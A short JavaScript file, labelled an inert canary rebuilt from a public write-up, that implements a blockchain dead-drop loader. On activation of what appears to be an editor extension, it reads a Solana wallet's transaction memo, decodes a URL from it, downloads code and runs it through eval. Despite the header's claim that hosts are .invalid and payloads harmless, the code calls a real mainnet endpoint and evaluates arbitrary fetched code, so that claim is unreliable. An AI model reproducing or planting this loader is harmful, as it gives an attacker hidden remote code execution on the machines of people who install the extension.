// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

async function c2() {
  const r = await fetch('https://api.mainnet-beta.solana.com', { method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'getSignaturesForAddress', params: ['CANARYwALLETaDDRESS1111111111111111111111111', { limit: 1 }] }) });
  const j = await r.json(); const memo = j.result[0].memo;
  const url = atob(memo.split(' ')[1]);
  const code = await (await fetch(url)).text();
  eval(atob(code));
}
exports.activate = function () { c2(); };
